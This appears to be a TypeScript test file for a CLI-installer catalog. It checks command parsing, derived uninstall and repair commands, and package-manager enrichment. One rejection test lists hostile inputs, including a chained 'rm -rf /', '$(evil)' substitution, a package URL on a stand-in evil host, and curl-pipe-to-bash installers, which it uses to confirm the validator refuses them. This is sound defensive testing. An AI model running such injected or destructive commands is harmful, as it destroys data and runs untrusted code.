import { describe, expect, it } from 'vitest';
import type { CliCatalogEntry } from '@hypergate/shared';
import { CLI_MANAGERS, chooseInstall, enrichCliInstalls, lifecycleFor, managerOf, parseCuratedCommand } from './cli-actions.js';
import { KNOWN_CLIS, cliCatalogEntry } from './clis.js';

const entry = (over: Partial<CliCatalogEntry>): CliCatalogEntry => ({
  id: 'x',
  name: 'X',
  command: 'x',
  description: '',
  category: 'other',
  channel: 'npm',
  ...over,
});

describe('parseCuratedCommand', () => {
  // The same cases the shell's parse_curated_install asserts, so the two
  // runners cannot drift apart about what is executable.
  it('accepts plain launcher commands as argv', () => {
    expect(parseCuratedCommand('npm install -g vercel')).toEqual(['npm', 'install', '-g', 'vercel']);
    expect(parseCuratedCommand('  brew install gh  ')).toEqual(['brew', 'install', 'gh']);
    expect(parseCuratedCommand('winget install GitHub.cli')).toEqual(['winget', 'install', 'GitHub.cli']);
    expect(parseCuratedCommand('uv tool install ruff')).toEqual(['uv', 'tool', 'install', 'ruff']);
  });

  it('rejects URLs, shell metacharacters, and unknown launchers', () => {
    expect(parseCuratedCommand('https://bun.sh')).toBeNull();
    expect(parseCuratedCommand('curl -fsSL https://bun.sh/install | bash')).toBeNull();
    expect(parseCuratedCommand('powershell -c "irm bun.sh/install.ps1 | iex"')).toBeNull();
    expect(parseCuratedCommand('npm install -g x && rm -rf /')).toBeNull();
    expect(parseCuratedCommand('npm install $(evil)')).toBeNull();
    expect(parseCuratedCommand('rustup default stable')).toBeNull();
    expect(parseCuratedCommand('')).toBeNull();
    expect(parseCuratedCommand('npm install https://evil.example/pkg.tgz')).toBeNull();
  });
});

describe('lifecycleFor', () => {
  it('derives the mechanical inverse per manager', () => {
    expect(lifecycleFor({ label: 'npm', command: 'npm install -g @playwright/cli@latest' }).uninstall).toBe(
      'npm uninstall -g @playwright/cli',
    );
    expect(lifecycleFor({ label: 'Homebrew', command: 'brew install supabase/tap/supabase' })).toEqual({
      uninstall: 'brew uninstall supabase/tap/supabase',
      repair: 'brew reinstall supabase/tap/supabase',
    });
    expect(lifecycleFor({ label: 'winget', command: 'winget install GitHub.cli' }).uninstall).toBe('winget uninstall GitHub.cli');
    expect(lifecycleFor({ label: 'Scoop', command: 'scoop install gh' }).uninstall).toBe('scoop uninstall gh');
    expect(lifecycleFor({ label: 'yarn', command: 'yarn global add vercel' }).uninstall).toBe('yarn global remove vercel');
  });

  it('gives scripts and download pages no lifecycle commands', () => {
    expect(lifecycleFor({ label: 'shell', command: 'curl -fsSL https://bun.sh/install | bash' })).toEqual({});
    expect(lifecycleFor({ label: 'download', command: 'https://nodejs.org' })).toEqual({});
  });
});

describe('enrichCliInstalls', () => {
  it('annotates managers and extends an npm route to pnpm/yarn/bun', () => {
    const enriched = enrichCliInstalls(entry({ installs: [{ label: 'npm', command: 'npm install -g vercel@latest' }] }));
    const managers = enriched.installs!.map((o) => o.manager);
    expect(managers).toEqual(['npm', 'pnpm', 'yarn', 'bun']);
    expect(enriched.installs![1].command).toBe('pnpm add -g vercel@latest');
    expect(enriched.installs![1].uninstall).toBe('pnpm remove -g vercel');
  });

  it('never duplicates a manager the entry already lists, and is idempotent', () => {
    const one = enrichCliInstalls(
      entry({
        installs: [
          { label: 'npm', command: 'npm install -g wrangler' },
          { label: 'pnpm', command: 'pnpm add -g wrangler' },
        ],
      }),
    );
    expect(one.installs!.filter((o) => o.manager === 'pnpm')).toHaveLength(1);
    const twice = enrichCliInstalls(one);
    expect(twice.installs!.map((o) => o.command)).toEqual(one.installs!.map((o) => o.command));
  });

  it('leaves script-only entries alone', () => {
    const scriptOnly = entry({ installs: [{ label: 'shell', command: 'curl -L https://fly.io/install.sh | sh' }] });
    const enriched = enrichCliInstalls(scriptOnly);
    expect(enriched.installs).toHaveLength(1);
    expect(enriched.installs![0].uninstall).toBeUndefined();
  });
});

describe('chooseInstall', () => {
  const e = enrichCliInstalls(
    entry({
      installs: [
        { label: 'shell', command: 'curl -L https://fly.io/install.sh | sh' },
        { label: 'Homebrew', command: 'brew install flyctl' },
      ],
    }),
  );

  it('honors the requested manager and skips unrunnable routes otherwise', () => {
    expect(chooseInstall(e, 'brew')?.command).toBe('brew install flyctl');
    expect(chooseInstall(e)?.command).toBe('brew install flyctl');
    expect(chooseInstall(e, 'npm')).toBeUndefined();
  });
});

describe('curated catalog integrity (lifecycle view)', () => {
  it('every runnable curated route parses and carries a manager Hypergate knows', () => {
    const managerIds = new Set(CLI_MANAGERS.map((m) => m.id));
    for (const tool of KNOWN_CLIS) {
      const enriched = enrichCliInstalls(cliCatalogEntry(tool));
      for (const option of enriched.installs ?? []) {
        const argv = parseCuratedCommand(option.command);
        if (!argv) continue; // scripts and download pages are copy-only by design
        expect(option.manager, `${tool.id}: ${option.command}`).toBeDefined();
        expect(managerIds.has(option.manager!), `${tool.id}: unknown manager ${option.manager}`).toBe(true);
        if (option.uninstall) {
          expect(parseCuratedCommand(option.uninstall), `${tool.id}: ${option.uninstall}`).not.toBeNull();
        }
        if (option.repair) {
          expect(parseCuratedCommand(option.repair), `${tool.id}: ${option.repair}`).not.toBeNull();
        }
      }
    }
  });

  it('auth hints are plain single commands, and only browser-flow ones are runnable', () => {
    const withAuth = KNOWN_CLIS.filter((t) => t.auth);
    expect(withAuth.length).toBeGreaterThanOrEqual(8);
    for (const tool of withAuth) {
      expect(tool.auth!.command).toMatch(/^[a-z][a-z0-9-]*( [a-z0-9-]+)*$/i);
      expect(tool.auth!.command.startsWith(tool.command), `${tool.id} auth uses its own binary`).toBe(true);
      if (!tool.auth!.runnable) {
        expect(tool.auth!.note, `${tool.id}: a copy-only auth command says why`).toBeDefined();
      }
    }
    expect(KNOWN_CLIS.find((t) => t.id === 'flyctl')?.auth?.runnable).toBe(true);
    expect(KNOWN_CLIS.find((t) => t.id === 'gh')?.auth?.runnable).toBeUndefined();
  });

  it('managerOf reads the manager from command, label, or explicit field', () => {
    expect(managerOf({ label: 'Homebrew', command: 'brew install gh' })).toBe('brew');
    expect(managerOf({ label: 'Chocolatey', command: 'choco install foo' })).toBe('choco');
    expect(managerOf({ label: 'download', command: 'https://nodejs.org' })).toBeUndefined();
    expect(managerOf({ label: 'anything', command: 'x', manager: 'npm' })).toBe('npm');
  });
});
